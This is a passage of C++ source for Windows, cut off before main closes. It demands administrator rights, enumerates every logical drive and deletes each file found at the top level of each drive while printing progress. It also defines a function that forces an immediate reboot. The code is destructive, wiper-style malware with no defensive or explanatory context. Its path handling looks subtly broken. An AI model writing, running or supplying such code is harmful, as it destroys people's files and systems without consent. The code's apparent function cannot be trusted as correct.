#include <iostream>
#include <windows.h>
#include <string>
#include <vector>

using namespace std;

bool IsAdministrator()
{
    HANDLE token;
    OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token);
    TOKEN_ELEVATION_TYPE elevationType;
    DWORD dwSize;
    GetTokenInformation(token, TokenElevationType, &elevationType, sizeof(elevationType), &dwSize);
    CloseHandle(token);

    return elevationType == TokenElevationTypeFull;
}

void Reboot()
{
    system("shutdown /r /t 0");
}

int main()
{
    if (!IsAdministrator())
    {
        cout << "This program must be run as administrator." << endl;
        return 0;
    }

    vector<string> drives;
    char buffer[MAX_PATH];
    GetLogicalDriveStrings(MAX_PATH, buffer);
    char *p = buffer;
    while (*p)
    {
        string drive = p;
        drives.push_back(drive);
        p += drive.length() + 1;
    }

    int numFilesDeleted = 0;
    int totalNumFiles = 0;

    for (string drive : drives)
    {
        vector<string> files;
        string searchPath = drive + "\\*";
        WIN32_FIND_DATA fd;
        HANDLE hFind = FindFirstFile(searchPath.c_str(), &fd);
        if (hFind != INVALID_HANDLE_VALUE)
        {
            do
            {
                if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
                {
                    string file = fd.cFileName;
                    files.push_back(file);
                }
            } while (FindNextFile(hFind, &fd));
            FindClose(hFind);
        }

        totalNumFiles += files.size();

        for (string file : files)
        {
            string filePath = drive + "\\" + file;
            DeleteFile(filePath.c_str());
            numFilesDeleted++;

            cout << (int)(((double)numFilesDeleted / totalNumFiles) * 100) << "% complete (" << numFilesDeleted << "/" << totalNumFiles << ")" << endl;
        }
    }

    Sleep(10000);

